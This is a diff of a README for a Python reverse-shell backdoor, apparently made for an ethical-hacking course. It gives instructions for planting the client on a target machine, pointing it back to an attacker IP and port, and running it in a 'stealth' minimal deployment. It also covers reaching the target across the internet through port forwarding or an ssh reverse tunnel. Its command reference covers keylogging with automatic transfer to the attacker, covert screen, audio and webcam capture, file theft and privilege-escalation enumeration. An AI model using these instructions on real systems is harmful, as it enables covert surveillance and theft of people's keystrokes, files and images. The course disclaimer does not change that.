@@ -8,22 +8,52 @@ This is an enhanced reverse shell backdoor created for the DES484 Ethical Hackin
 
 ```
 DES484_Backdoor/
-├── backend.py                    # Attacker controller (runs on attacker machine)
-├── server.py                     # Backdoor client (deploys on target machine)
-├── features/                     # Feature modules
-│   ├── keylogger.py             # Keystroke logging
-│   ├── privilege_escalation.py  # Privilege escalation techniques
-│   ├── screen_audio_capture.py  # Screen, audio, and webcam capture
-│   ├── network_discovery.py     # Network reconnaissance
-│   └── persistence.py           # Persistence mechanisms
-├── logs/                        # Logs directory (auto-created)
-│   ├── keylog.txt              # Keystroke logs
-│   ├── screenshots/            # Captured screenshots
-│   ├── audio/                  # Audio recordings
-│   └── webcam/                 # Webcam captures
+├── backdoor.py                  # Backdoor client (deploys on target machine)
+├── server.py                    # Attacker controller (runs on attacker machine)
 ├── requirements.txt             # Python dependencies (optional)
-├── requirements_minimal.txt     # Minimal deployment (no dependencies)
-└── README.md                    # This file
+├── IMPLEMENTATION_GUIDE.md      # Detailed setup and usage guide
+├── README.md                    # This file
+│
+├── features/                    # Feature modules
+│   ├── __init__.py
+│   ├── keylogger.py            # Keystroke logging with auto-download
+│   ├── privilege_escalation.py # Privilege escalation techniques
+│   ├── screen_audio_capture.py # Screen, audio, webcam, and screen recording
+│   └── network_discovery.py    # Network reconnaissance
+│
+├── utils/                       # Utility modules
+│   ├── __init__.py
+│   ├── check_environment.py    # Environment validation
+│   └── configure.py            # Configuration helpers
+│
+├── exploitation/                # Exploitation and payload building
+│   ├── build_executable.py     # Build standalone executables
+│   ├── EXECUTABLE_GUIDE.md     # Guide for creating executables
+│   ├── SUMMARY.md              # Exploitation summary
+│   ├── icons/                  # Icons for executables
+│   │   └── README.md
+│   └── payloads/               # Payload templates
+│       └── README.md
+│
+└── logs/                        # Logs directory (auto-created)
+    ├── keylog/                 # Keystroke logs
+    │   └── keylog.txt          # Main keylog file
+    ├── screenshots/            # Captured screenshots
+    ├── audio/                  # Audio recordings
+    ├── webcam/                 # Webcam captures
+    └── recordings/             # Screen recordings
+        └── README.md           # Recording guide
+```
+
+### 📥 Downloaded Files (on Attacker Machine)
+
+When using the backdoor, certain commands automatically download files to your attacker machine:
+
+```
+Attacker_Machine/
+├── keylog_dump_YYYYMMDD_HHMMSS.txt  # Downloaded keylog files
+├── server.py                         # Your controller
+└── (downloaded screenshots, recordings, etc.)
 ```
 
 ## 🎯 Features Implemented
@@ -32,8 +62,10 @@ DES484_Backdoor/
 
 - Real-time keystroke capture
 - Logs keystrokes to file with timestamps
+- **Auto-download feature**: `keylog_dump` automatically downloads log file to attacker machine
 - Works with or without external libraries (fallback mode)
-- Commands: `keylog_start`, `keylog_stop`, `keylog_dump`, `keylog_clear`
+- Downloaded as: `keylog_dump_YYYYMMDD_HHMMSS.txt`
+- Commands: `keylog_start`, `keylog_stop`, `keylog_dump`, `keylog_clear`, `keylog_status`
 
 ### 2. **Privilege Escalation** 🔐
 
@@ -44,15 +76,19 @@ DES484_Backdoor/
 - List running services
 - Check scheduled tasks
 - Find sensitive files
-- Commands: `priv_check`, `priv_enum`, `priv_services`, `priv_tasks`
+- Commands: `priv_check`, `priv_enum`, `priv_services`, `priv_tasks`, `priv_sensitive`
 
 ### 3. **Screen & Media Capture** 📸
 
-- Screenshot capture (single or multiple)
-- Audio recording from microphone
-- Webcam image capture
+- **Screenshot capture**: Single or multiple screenshots
+- **Audio recording**: Record from microphone
+- **Webcam capture**: Capture images from webcam
+- **Screen recording** (NEW): Record screen video with configurable FPS
+  - Timed recording: `record_screen <duration> <fps>`
+  - Background recording: `record_start`, `record_stop`
+  - Multiple recording methods (OpenCV, MSS, ffmpeg)
 - Multiple fallback methods for compatibility
-- Commands: `screenshot`, `audio_record`, `webcam_snap`
+- Commands: `screenshot`, `screenshot_multi`, `audio_record`, `webcam_snap`, `record_screen`, `record_start`, `record_stop`, `record_list`
 
 ### 4. **Network Discovery** 🌐
 
@@ -63,14 +99,14 @@ DES484_Backdoor/
 - ARP cache inspection
 - Public IP detection
 - Internet connectivity check
-- Commands: `net_info`, `net_scan`, `net_portscan`, `net_connections`
+- Commands: `net_info`, `net_scan`, `net_portscan`, `net_connections`, `net_public_ip`, `net_check_internet`
 
-### 5. **Persistence** 🔄
+### 5. **File Operations** �
 
-- Automatic startup on system boot
-- Platform-specific implementations (Windows, Linux, macOS)
-- Multiple persistence techniques
-- Commands: `persist_install`, `persist_check`, `persist_remove`
+- Download files from target to attacker
+- Upload files from attacker to target
+- Directory navigation
+- Commands: `download <file>`, `upload <file>`, `cd <dir>`
 
 ## 🚀 Installation & Setup
 
@@ -101,9 +137,13 @@ DES484_Backdoor/
    - `Pillow` - Screenshot capture
    - `pyautogui` - Screen automation
    - `pyaudio` - Audio recording
-   - `opencv-python` - Webcam capture
+   - `opencv-python` - Webcam and screen recording
+   - `numpy` - Screen recording support
+   - `mss` - Fast screen capture
+   - `imageio` - Video file creation
+   - `imageio-ffmpeg` - FFmpeg codec support
 
-   **Note:** The controller script (`backend.py`) uses only standard Python libraries, but if you're building executables or testing features locally, install these dependencies.
+   **Note:** The controller script (`server.py`) uses only standard Python libraries. Install these dependencies for full feature support on target machines.
 
 3. **Find your IP address:**
 
@@ -119,9 +159,9 @@ DES484_Backdoor/
 
 4. **Start the listener:**
    ```bash
-   python3 backend.py
+   python3 server.py
    # Or specify custom port:
-   python3 backend.py 5555
+   python3 server.py 5555
    ```
 
 ### For Target Machine (Backdoor Client)
@@ -142,16 +182,16 @@ DES484_Backdoor/
    ```
 
 3. **Configure the backdoor:**
-   Edit `server.py` and change the connection settings:
+   Edit `backdoor.py` and change the connection settings:
 
    ```python
    ATTACKER_HOST = '192.168.1.12'  # Your attacker IP
-   ATTACKER_PORT = 5555            # Your listener port
+   ATTACKER_PORT = 5556            # Your listener port
    ```
 
 4. **Run the backdoor:**
    ```bash
-   python3 server.py
+   python3 backdoor.py
    ```
 
 #### Method 2: Minimal Deployment (Stealth Mode)
@@ -161,26 +201,26 @@ DES484_Backdoor/
 1. **Copy only necessary files:**
 
    ```bash
-   # Copy server.py and features/ directory
-   scp -r server.py features/ user@target:/tmp/backdoor/
+   # Copy backdoor.py and features/ directory
+   scp -r backdoor.py features/ user@target:/tmp/backdoor/
    ```
 
 2. **Run without dependencies:**
 
    ```bash
    cd /tmp/backdoor
-   python3 server.py
+   python3 backdoor.py
    ```
 
    The backdoor will use fallback methods (system commands) for all features.
 
 #### Method 3: Single-File Deployment (Advanced)
 
-**For minimal footprint**, you can embed the features into `server.py` or use only basic features:
+**For minimal footprint**, you can embed the features into `backdoor.py` or use only basic features:
 
 ```bash
-# Edit server.py to disable features if imports fail
-python3 server.py
+# Edit backdoor.py to disable features if imports fail
+python3 backdoor.py
 ```
 
 ## 📖 Usage Guide
@@ -190,20 +230,20 @@ python3 server.py
 1. **Start the controller on attacker machine:**
 
    ```bash
-   python3 backend.py
+   python3 server.py
    ```
 
    Output:
 
    ```
-   [+] Listening on 0.0.0.0:5555
+   [+] Listening on 0.0.0.0:5556
    [*] Waiting for incoming connections...
    ```
 
 2. **Deploy and run backdoor on target:**
 
    ```bash
-   python3 server.py
+   python3 backdoor.py
    ```
 
 3. **Connection established:**
@@ -248,13 +288,17 @@ quit
 # Start capturing keystrokes
 keylog_start
 
-# Check captured keystrokes
+# Download captured keystrokes (auto-downloads to attacker machine)
 keylog_dump
+# File saved as: keylog_dump_YYYYMMDD_HHMMSS.txt
+
+# Check keylogger status
+keylog_status
 
 # Stop keylogger
 keylog_stop
 
-# Clear logs
+# Clear logs on target
 keylog_clear
 ```
 
@@ -291,6 +335,31 @@ screenshot_list
 
 # Download screenshot
 download logs/screenshots/screenshot_20241002_143022.png
+```
+
+#### Screen Recording
+
+```bash
+# Record screen for 10 seconds at 15 fps (default)
+record_screen
+
+# Record for 30 seconds at 30 fps (high quality)
+record_screen 30 30
+
+# Start background recording (max 1 hour)
+record_start
+
+# Check recording status
+record_status
+
+# Stop background recording
+record_stop
+
+# List all recordings
+record_list
+
+# Download recording
+download logs/recordings/screen_recording_20241004_143022.mp4
 ```
 
 #### Audio & Webcam
@@ -331,19 +400,6 @@ net_public_ip
 net_check_internet
 ```
 
-#### Persistence
-
-```bash
-# Install persistence
-persist_install
-
-# Check if persistence is installed
-persist_check
-
-# Remove persistence
-persist_remove
-```
-
 ## 🔧 Troubleshooting
 
 ### Connection Issues
@@ -352,11 +408,11 @@ persist_remove
 
 ```bash
 # On attacker machine, check firewall:
-sudo ufw allow 5555/tcp          # Linux
-sudo firewall-cmd --add-port=5555/tcp  # CentOS/RHEL
+sudo ufw allow 5556/tcp          # Linux
+sudo firewall-cmd --add-port=5556/tcp  # CentOS/RHEL
 
 # Verify listener is running:
-netstat -an | grep 5555
+netstat -an | grep 5556
 ```
 
 **Problem:** Wrong IP address
@@ -389,7 +445,12 @@ pip install -r requirements.txt
 # Features automatically use fallback methods
 
 # To use full features, install:
-pip install pynput Pillow pyautogui pyaudio opencv-python
+pip install pynput Pillow pyautogui pyaudio opencv-python numpy mss imageio imageio-ffmpeg
+
+# For screen recording, also install ffmpeg (recommended):
+# macOS:   brew install ffmpeg
+# Ubuntu:  sudo apt-get install ffmpeg
+# Windows: Download from ffmpeg.org
 ```
 
 ### Permission Issues
@@ -398,7 +459,7 @@ pip install pynput Pillow pyautogui pyaudio opencv-python
 
 ```bash
 # Run with appropriate permissions:
-sudo python3 server.py            # For privileged operations
+sudo python3 backdoor.py          # For privileged operations
 
 # Or use privilege escalation features:
 priv_enum                         # Find escalation vectors
@@ -409,9 +470,9 @@ priv_enum                         # Find escalation vectors
 ### Same Network (LAN)
 
 ```python
-# In server.py:
-ATTACKER_HOST = '192.168.1.12'    # Attacker's local IP
-ATTACKER_PORT = 5555
+# In backdoor.py:
+ATTACKER_HOST = '192.168.0.107'   # Attacker's local IP
+ATTACKER_PORT = 5556
 ```
 
 ### Different Networks (WAN/Internet)
@@ -420,9 +481,9 @@ ATTACKER_PORT = 5555
 
 ```bash
 # On attacker's router:
-# Forward external_port -> attacker_ip:5555
+# Forward external_port -> attacker_ip:5556
 
-# In server.py:
+# In backdoor.py:
 ATTACKER_HOST = 'attacker_public_ip'
 ATTACKER_PORT = external_port
 ```
@@ -431,11 +492,11 @@ ATTACKER_PORT = external_port
 
 ```bash
 # On target:
-ssh -R 5555:localhost:5555 user@attacker_public_ip
+ssh -R 5556:localhost:5556 user@attacker_public_ip
 
-# In server.py:
+# In backdoor.py:
 ATTACKER_HOST = 'localhost'
-ATTACKER_PORT = 5555
+ATTACKER_PORT = 5556
 ```
 
 **Method 3: VPN**
@@ -445,6 +506,27 @@ ATTACKER_PORT = 5555
 # Both machines connect to same VPN
 # Use VPN IP addresses
 ```
+
+## 📚 Documentation
+
+This project includes comprehensive documentation:
+
+- **README.md** (this file) - Quick start and overview
+- **IMPLEMENTATION_GUIDE.md** - Detailed setup, testing, and feature guides
+- **exploitation/** - Guides for building executables and payloads
+  - **EXECUTABLE_GUIDE.md** - How to create standalone executables
+  - **SUMMARY.md** - Exploitation techniques summary
+
+### Additional Resources
+
+For detailed information about specific features, see:
+
+- Keylogger auto-download feature
+- Screen recording capabilities
+- Network discovery techniques
+- Privilege escalation methods
+
+All features are documented in `IMPLEMENTATION_GUIDE.md`.
 
 ## ⚖️ Ethical Guidelines
 
@@ -465,3 +547,61 @@ ATTACKER_PORT = 5555
 ❌ Without written authorization
 
 **Disclaimer:** The authors are not responsible for misuse of this tool. Users must comply with all applicable laws and ethical guidelines.
+
+## 🚀 Quick Reference
+
+### Essential Commands
+
+| Category        | Command                | Description                |
+| --------------- | ---------------------- | -------------------------- |
+| **Help**        | `help`                 | Show basic commands        |
+|                 | `help_advanced`        | Show all advanced features |
+|                 | `quick`                | Quick reference guide      |
+| **System**      | `sysinfo`              | Display system information |
+|                 | `cd <dir>`             | Change directory           |
+| **Files**       | `download <file>`      | Download file from target  |
+|                 | `upload <file>`        | Upload file to target      |
+| **Keylogger**   | `keylog_start`         | Start keystroke capture    |
+|                 | `keylog_dump`          | Download keylog file       |
+|                 | `keylog_stop`          | Stop keylogger             |
+| **Screenshots** | `screenshot`           | Capture single screenshot  |
+|                 | `screenshot_multi 5 2` | Multiple screenshots       |
+| **Recording**   | `record_screen 30 15`  | Record screen (30s, 15fps) |
+|                 | `record_start`         | Start background recording |
+|                 | `record_stop`          | Stop recording             |
+| **Network**     | `net_info`             | Network information        |
+|                 | `net_scan`             | Scan local network         |
+| **Privileges**  | `priv_check`           | Check current privileges   |
+|                 | `priv_enum`            | Find escalation vectors    |
+| **Exit**        | `quit`                 | Close connection           |
+
+### File Locations
+
+**On Target Machine:**
+
+- Keylogs: `logs/keylog/keylog.txt`
+- Screenshots: `logs/screenshots/`
+- Recordings: `logs/recordings/`
+- Audio: `logs/audio/`
+- Webcam: `logs/webcam/`
+
+**On Attacker Machine:**
+
+- Downloaded keylogs: `keylog_dump_YYYYMMDD_HHMMSS.txt`
+- Other downloads: Same directory as `server.py`
+
+---
+
+## 📞 Support & Contributions
+
+This is an educational project for DES484 Ethical Hacking course at SIIT.
+
+**For detailed setup and troubleshooting, see:** `IMPLEMENTATION_GUIDE.md`
+
+---
+
+**⚠️ REMEMBER: Educational Use Only - Always Get Authorization!**
+
+```
+
+```
